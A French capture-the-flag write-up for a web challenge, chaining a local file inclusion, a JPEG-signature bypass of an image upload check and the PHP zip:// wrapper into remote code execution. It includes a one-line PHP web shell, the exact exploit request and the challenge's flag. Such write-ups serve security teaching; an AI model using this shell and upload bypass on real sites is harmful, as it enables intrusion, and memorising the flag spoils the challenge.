# Wall Of Shame

## Description

Êtes-vous un 1337 h4ck3r? Si oui vous n'aurez aucun mal à trouver le flag, situé à `/flag.txt`.

Sinon... vous devrez ajouter votre photo au mur de la honte!

## Solution

Il faut d'abord trouver le LFI dans l'url: `?page=whatever`. Il n'est pas possible de lire directement le flag, car `.php` est ajouté à notre input:

`Warning: include(whatever.php): failed to open stream: No such file or directory...`

Nous avons également accès à un file upload, mais le fichier ne sera jamais sauvegardé avec l'extension `.php` requis pour obtenir de l'exécution de code.

Est-il possible de référencer un fichier uploadé (donc ne se terminant pas par `.php`) via LFI (donc avec un input se terminant par `.php`)? La réponse est oui! Il suffit d'utiliser le [wrapper php zip](https://www.php.net/manual/en/wrappers.compression.php).

Avant cela, toutefois, il faudra réussir à uploadé un fichier zip alors que l'upload vérifie que le fichier est une image. Pour ce faire, il suffit de modifier les 4 premiers bytes du zip et les remplacer pour `FF D8 FF DB`, la signature d'un JPEG.

Voici donc les étapes de l'attaque:

1. Créer un fichier `pwned.php` contenant notre payload: `<?php passthru($_GET['cmd']); ?>`

2. Zippé le fichier `pwned.php` vers `pwned.zip`.

3. À l'aide de l'hex editor de votre choix (j'utilise `Frhed` sur Windows), modifier les 4 premiers bytes de `pwned.zip` pour les remplacer par la signature d'un JPEG: `FF D8 FF DB`.

4. Uploader `pwned.zip`. Votre fichier sera uploadé à un dossier et un nom aléatoire. Dans mon cas, c'est `uploads/0229294de30451724effba7a04799663/65a6539130c38d1539ce5e677318d14d.jpg`.

5. Utilisez le LFI pour obtenir de l'exécution de code en envoyant une requête à `/?page=zip://uploads/0229294de30451724effba7a04799663/65a6539130c38d1539ce5e677318d14d.jpg%23pwned&cmd=cat /flag.txt`

## Flag

FLAG-dae14a395b41019d0cd6241ddbaa1085

